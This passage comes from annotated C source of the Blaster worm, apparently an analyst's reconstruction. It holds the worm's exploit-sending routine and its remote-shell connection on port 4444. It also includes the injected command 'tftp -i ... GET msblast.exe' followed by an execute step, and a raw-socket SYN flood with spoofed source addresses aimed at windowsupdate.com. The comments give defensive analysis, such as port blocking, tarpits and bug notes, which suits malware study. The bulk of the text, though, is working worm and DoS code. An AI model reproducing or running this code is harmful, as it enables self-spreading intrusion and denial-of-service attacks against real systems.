,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x20,0x00,0x00,0x00,0x30,0x00,0x2D,0x00,0x00,0x00

,0x00,0x00,0x88,0x2A,0x0C,0x00,0x02,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x28,0x8C

,0x0C,0x00,0x01,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00
};

int ThreadId;
int len;
int sizeof_sa;
int ret;
int opt;
void *hThread;
struct sockaddr_in target_ip;
struct sockaddr_in sa;
int fd;
char cmdstr[0x200];
int len1;
unsigned char buf2[0x1000];
int i;

/* 
* Turn off non-blocking (i.e. re-enable blocking mode) 
* DEFENSE: Tarpit programs (e.g. 'labrea' or 'deredoc')
* will slow down the spread of this worm. It takes a long
* time for blocking calls to timeout. I had several 
* thousand worms halted by my 'deredoc' tarpit.
*/
opt = 0;
ioctlsocket(sock, FIONBIO , &opt);

/*
* Choose whether the exploit targets Win2k or WinXP.
*/
if (winxp1_or_win2k2 == 1)
ret = 0x100139d;
else
ret = 0x18759f;
memcpy(sc+36, (unsigned char *) &ret, 4);

/* ----------------------------------------------
* This section is just copied from the original exploit
* script. This is the same as the scripts that have been
* widely published on the Internet. */
len=sizeof(sc);
memcpy(buf2,request1,sizeof(request1));
len1=sizeof(request1);

*(unsigned long *)(request2)=*(unsigned long *)(request2)+sizeof(sc)/2; 
*(unsigned long *)(request2+8)=*(unsigned long *)(request2+8)+sizeof(sc)/2;

memcpy(buf2+len1,request2,sizeof(request2));
len1=len1+sizeof(request2);
memcpy(buf2+len1,sc,sizeof(sc));
len1=len1+sizeof(sc);
memcpy(buf2+len1,request3,sizeof(request3));
len1=len1+sizeof(request3);
memcpy(buf2+len1,request4,sizeof(request4));
len1=len1+sizeof(request4);

*(unsigned long *)(buf2+8)=*(unsigned long *)(buf2+8)+sizeof(sc)-0xc;


*(unsigned long *)(buf2+0x10)=*(unsigned long *)(buf2+0x10)+sizeof(sc)-0xc; 
*(unsigned long *)(buf2+0x80)=*(unsigned long *)(buf2+0x80)+sizeof(sc)-0xc;
*(unsigned long *)(buf2+0x84)=*(unsigned long *)(buf2+0x84)+sizeof(sc)-0xc;
*(unsigned long *)(buf2+0xb4)=*(unsigned long *)(buf2+0xb4)+sizeof(sc)-0xc;
*(unsigned long *)(buf2+0xb8)=*(unsigned long *)(buf2+0xb8)+sizeof(sc)-0xc;
*(unsigned long *)(buf2+0xd0)=*(unsigned long *)(buf2+0xd0)+sizeof(sc)-0xc;
*(unsigned long *)(buf2+0x18c)=*(unsigned long *)(buf2+0x18c)+sizeof(sc)-0xc;

if (send(sock,bindstr,sizeof(bindstr),0)== -1)
{
//perror("- Send");
return;
}


if (send(sock,buf2,len1,0)== -1)
{
//perror("- Send");
return;
}
closesocket(sock);
Sleep(400);
/* ----------------------------------------------*/


/*
* This section of code connects to the victim on port 4444.
* DEFENSE : This means you can block this worm by blocking
* TCP port 4444.
* FAQ: This port is only open for the brief instant needed
* to exploit the victim. Therefore, you can't scan for 
* port 4444 in order to find Blaster victims.
*/
if ((fd=socket(AF_INET,SOCK_STREAM,0)) == -1)
return;
memset(&target_ip, 0, sizeof(target_ip));
target_ip.sin_family = AF_INET;
target_ip.sin_port = htons(SHELL_PORT_4444);
target_ip.sin_addr.s_addr = inet_addr(victim_ip);
if (target_ip.sin_addr.s_addr == SOCKET_ERROR)
return;
if (connect(fd, (struct sockaddr*)&target_ip, 
sizeof(target_ip)) == SOCKET_ERROR)
return;

/*
* This section recreates the IP address from whatever IP
* address this successfully connected to. In practice,
* the strings "victim_ip" and "target_ip_string" should be
* the same.
*/
memset(target_ip_string, 0, sizeof(target_ip_string));
sizeof_sa = sizeof(sa);
getsockname(fd, (struct sockaddr*)&sa, &sizeof_sa);
sprintf(target_ip_string, "%d.%d.%d.%d", 
sa.sin_addr.s_net, sa.sin_addr.s_host, 
sa.sin_addr.s_lh, sa.sin_addr.s_impno);

/*
* This section creates a temporary TFTP service that is 
* ONLY alive during the period of time that the victim
* needs to download.
* FAQ: You can't scan for TFTP in order to find Blaster 
* victims because the port is rarely open.
*/
if (fd_tftp_service)
closesocket(fd_tftp_service);
hThread = CreateThread(0,0,
blaster_tftp_thread,0,0,&ThreadId);
Sleep(80); /*give time for thread to start*/

/*
* This sends the command
* tftp -i 1.2.3.4 GET msblast.exe
* to the victim. The "tftp.exe" program is built into
* Windows. It's intended purpose is to allow users to 
* manually update their home wireless access points with
* new software (and other similar tasks). However, it is
* not intended as a generic file-transfer protocol (it
* stands for "trivial-file-transfer-protocol" -- it is
* intended for only trivial tasks). Since a lot of hacker
* exploits use the "tftp.exe" program, a good hardening
* step is to remove/rename it.
*/
sprintf(cmdstr, "tftp -i %s GET %s\n", 
target_ip_string, MSBLAST_EXE);
if (send(fd, cmdstr, strlen(cmdstr), 0) <= 0)
goto closesocket_and_return;

/* 
* Wait 21 seconds for the victim to request the file, then
* for the file to be delivered via TFTP.
*/
Sleep(1000);
for (i=0; i<10 && is_tftp_running; i++)
Sleep(2000);

/*
* Assume the the transfer is successful, and send the 
* command to start executing the newly downloaded program.
* BUFORD: The hacker starts this twice. Again, it 
* demonstrates a lock of confidence, so he makes sure it's
* started by doing it twice in slightly different ways.
* Note that the "BILLY" mutex will prevent from actually
* running twice.
*/
sprintf(cmdstr, "start %s\n", MSBLAST_EXE);
if (send(fd, cmdstr, strlen(cmdstr), 0) <= 0)
goto closesocket_and_return;
Sleep(2000);
sprintf(cmdstr, "%s\n", MSBLAST_EXE);
send(fd, cmdstr, strlen(cmdstr), 0);
Sleep(2000);


/*
* This section closes the things started in this procedure
*/
closesocket_and_return:

/* Close the socket for the remote command-prompt that has
* been established to the victim. */
if (fd != 0)
closesocket(fd);

/* Close the TFTP server that was launched above. As noted,
* this means that the TFTP service is not running most of
* the time, so it's not easy to scan for infected systems.
*/
if (is_tftp_running) {
TerminateThread(hThread,0);
closesocket(fd_tftp_service);
is_tftp_running = 0;
}
CloseHandle(hThread);
}


/**
* Convert the name into an IP address. If the IP address
* is formatted in decimal-dot-notation (e.g. 192.2.0.43),
* then return that IP address, otherwise do a DNS lookup
* on the address. Note that in the case of the worm,
* it always gives the string "windowsupdate.com" to this
* function, and since Microsoft turned off that name,
* the DNS lookup will usually fail, so this function
* generally returns -1 (SOCKET_ERROR), which means the
* address 255.255.255.255.
*/
int blaster_resolve_ip(const char *windowsupdate_com)
{
int result;

result = inet_addr(windowsupdate_com);
if (result == SOCKET_ERROR) {
HOSTENT *p_hostent = gethostbyname(windowsupdate_com);
if (p_hostent == NULL)
result = SOCKET_ERROR;
else
result = *p_hostent->h_addr;
}

return result;
}


/*
* This thre
*/
ULONG WINAPI blaster_DoS_thread(LPVOID p)
{
int opt = 1;
int fd;
int target_ip;


/* Lookup the domain-name. Note that no checking is done 
* to ensure that the name is valid. Since Microsoft turned
* this off in their domain-name servers, this function now
* returns -1. */
target_ip = blaster_resolve_ip("windowsupdate.com");


/* Create a socket that the worm will blast packets at 
* Microsoft from. This is what is known as a "raw" socket. 
* So-called "raw-sockets" are ones where packets are 
* custom-built by the programmer rather than by the TCP/IP 
* stack. Note that raw-sockets were not available in Windows
* until Win2k. A cybersecurity pundit called Microsoft
* "irresponsible" for adding them. 
* <http://grc.com/dos/sockettome.htm>
* That's probably an
* unfairly harsh judgement (such sockets are available in
* every other OS), but it's true that it puts the power of
* SYNflood attacks in the hands of lame worm writers. While
* the worm-writer would probably have chosen a different
* DoS, such as Slammer-style UDP floods, it's likely that
* Buford wouldn't have been able to create a SYNflood if
* raw-sockets had not been added to Win2k/WinXP. */
fd = WSASocket(
AF_INET, /*TCP/IP sockets*/
SOCK_RAW, /*Custom TCP/IP headers*/
IPPROTO_RAW,
NULL,
0,
WSA_FLAG_OVERLAPPED
);
if (fd == SOCKET_ERROR)
return 0;

/* Tell the raw-socket that IP headers will be created by the
* programmer rather than the stack. Most raw sockets in
* Windows will also have this option set. */
if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, 
(char*)&opt, sizeof(opt)) == SOCKET_ERROR)
return 0;


/* Now do the SYN flood. The worm writer decided to flood
* slowly by putting a 20-millisecond delay between packets
* -- causing only 500 packets/second, or roughly, 200-kbps.
* There are a couple of reasons why the hacker may have
* chosen this. 
* 1. SYNfloods are not intended to be bandwidth floods,
* even slow rates are hard to deal with.
* 2. Slammer DoSed both the sender and receiver, therefore
* senders hunted down infected systems and removed
* them. This won't DoS the sender, so people are more
* likely not to care about a few infected machines.
*/
for (;;) {
blaster_send_syn_packet(target_ip, fd);

/* Q: How fast does it send the SYNflood?
* A: About 50 packets/second, where each packet is 
* 320-bits in size, for a total of 15-kbps.
* It means that Buford probably intended for 
* dialup users to be a big source of the DoS
* attack. He was smart enough to realize that 
* faster floods would lead to users discovering
* the worm and turning it off. */
Sleep(20);
}


closesocket(fd);
return 0;
}



/*
* This is a standard TCP/IP checksum algorithm
* that you find all over the web.
*/
int blaster_checksum(const void *bufv, int length)
{
const unsigned short *buf = (const unsigned short *)bufv;
unsigned long result = 0;

while (length > 1) {
result += *(buf++);
length -= sizeof(*buf); 
}
if (length) result += *(unsigned char*)buf; 
result = (result >> 16) + (result & 0xFFFF);
result += (result >> 16); 
result = (~result)&0xFFFF; 

return (int)result;
}



/*
* This is a function that uses "raw-sockets" in order to send
* a SYNflood at the victim, which is "windowsupdate.com" in 
* the case of the Blaster worm.
*/
void blaster_send_syn_packet(int target_ip, int fd)
{

struct IPHDR
{
unsigned char verlen; /*IP version & length */
unsigned char tos; /*IP type of service*/
unsigned short totallength;/*Total length*/
unsigned short id; /*Unique identifier */
unsigned short offset; /*Fragment offset field*/
unsigned char ttl; /*Time to live*/
unsigned char protocol; /*Protocol(TCP, UDP, etc.)*/
unsigned short checksum; /*IP checksum*/
unsigned int srcaddr; /*Source address*/
unsigned int dstaddr; /*Destination address*/

};
struct TCPHDR
{
unsigned short srcport;
unsigned short dstport;
unsigned int seqno;
unsigned int ackno;
unsigned char offset;
unsigned char flags;
unsigned short window;
unsigned short checksum;
unsigned short urgptr;
};
struct PSEUDO
{
unsigned int srcaddr;
unsigned int dstaddr;
unsigned char padzero;
unsigned char protocol;
unsigned short tcplength;
};
struct PSEUDOTCP
{
unsigned int srcaddr;
unsigned int dstaddr;
unsigned char padzero;
unsigned char protocol;
unsigned short tcplength;
struct TCPHDR tcphdr;
};




char spoofed_src_ip[16];
unsigned short target_port = 80; /*SYNflood web servers*/
struct sockaddr_in to; 
struct PSEUDO pseudo; 
char buf[60] = {0}; 
struct TCPHDR tcp;
struct IPHDR ip;
int source_ip;


/* Yet another randomizer-seeding */
srand(GetTickCount());

/* Generate a spoofed source address that is local to the
* current Class B subnet. This is pretty smart of Buford.
* Using just a single IP address allows defenders to turn
* it off on the firewall, whereas choosing a completely
* random IP address would get blocked by egress filters
* (because the source IP would not be in the proper range).
* Randomly choosing nearby IP addresses it probably the 
* best way to evade defenses */
sprintf(spoofed_src_ip, "%i.%i.%i.%i", 
local_class_a, local_class_b, rand()%255, rand()%255);
source_ip = blaster_resolve_ip(spoofed_src_ip);

/* Build the sockaddr_in structure. Normally, this is what
* the underlying TCP/IP stack uses to build the headers
* from. However, since the DoS attack creates its own
* headers, this step is largely redundent. */
to.sin_family = AF_INET;
to.sin_port = htons(target_port); /*this makes no sense */
to.sin_addr.s_addr = target_ip;

/* Create the IP header */
ip.verlen = 0x45;
ip.totallength = htons(sizeof(ip) + sizeof(tcp));
ip.id = 1;
ip.offset = 0;
ip.ttl = 128;
ip.protocol = IPPROTO_TCP;
ip.checksum = 0; /*for now, set to true value below */
ip.dstaddr = target_ip;

/* Create the TCP header */
tcp.dstport = htons(target_port);
tcp.ackno = 0;
tcp.offset = (unsigned char)(sizeof(tcp)<<4);
tcp.flags = 2; /*TCP_SYN*/
tcp.window = htons(0x4000);
tcp.urgptr = 0;
tcp.checksum = 0; /*for now, set to true value below */

/* Create pseudo header (which copies portions of the IP
* header for TCP checksum calculation).*/
pseudo.dstaddr = ip.dstaddr;
pseudo.padzero = 0;
pseudo.protocol = IPPROTO_TCP;
pseudo.tcplength = htons(sizeof(tcp));

/* Use the source adress chosen above that is close, but
* not the same, as the spreader's IP address */
ip.srcaddr = source_ip;

/* Choose a random source port in the range [1000-19999].*/
tcp.srcport = htons((unsigned short)((rand()%1000)+1000)); 

/* Choose a random sequence number to start the connection.
* BUG: Buford meant htonl(), not htons(), which means seqno
* will be 15-bits, not 32-bits, i.e. in the range 
* [0-32767]. (the Windows rand() function only returns
* 15-bits). */
tcp.seqno = htons((unsigned short)((rand()<<16)|rand()));

pseudo.srcaddr = source_ip;

/* Calculate TCP checksum */
memcpy(buf, &pseudo, sizeof(pseudo));
memcpy(buf+sizeof(pseudo), &tcp, sizeof(tcp));
tcp.checksum = blaster_checksum(buf, 
sizeof(pseudo)+sizeof(tcp));

memcpy(buf, &ip, sizeof(ip));
memcpy(buf+sizeof(ip), &tcp, sizeof(tcp));

/* I have no idea what's going on here. The assembly code
* zeroes out a bit of memory near the buffer. I don't know
* if it is trying to zero out a real variable that happens
* to be at the end of the buffer, or if it is trying to zero
* out part of the buffer itself. */
memset(buf+sizeof(ip)+sizeof(tcp), 0,
sizeof(buf)-sizeof(ip)-sizeof(tcp));

/* Major bug here: the worm writer incorrectly calculates the
* IP checksum over the entire packet. This is incorrect --
* the IP checksum is just for the IP header itself, not for
* the TCP header or data. However, Windows fixes the checksum
* anyway, so the bug doesn't appear in the actual packets
* themselves.
*/
ip.checksum = blaster_checksum(buf, sizeof(ip)+sizeof(tcp));

/* Copy the header over again. The reason for this is simply to
* copy over the checksum that was just calculated above, but
* it's easier doing this for the programmer rather than
* figuring out the exact offset where the checksum is
* located */
memcpy(buf, &ip, sizeof(ip));

/* Send the packet */
sendto(fd, buf, sizeof(ip)+sizeof(tcp), 0,
(struct sockaddr*)&to, sizeof(to));
}